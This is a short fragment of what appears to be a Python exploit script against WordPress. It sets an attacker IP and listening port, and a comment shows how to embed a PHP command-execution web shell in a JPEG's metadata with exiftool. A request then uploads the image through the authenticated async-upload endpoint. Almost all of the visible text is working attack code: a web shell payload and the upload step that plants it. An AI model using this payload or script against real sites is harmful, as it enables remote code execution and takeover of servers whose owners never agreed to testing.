...
lhost = '127.0.0.1'  # attacker ip
lport = '1337'  # listening port
...
# 3- inject the php payload via exiftool : exiftool cat.jpg -CopyrightNotice="<?=\`\$_GET[0]\`?>"
...
r_upload = requests.post(url+'wp-admin/async-upload.php',
                         data=data, files=image, cookies=cookies)
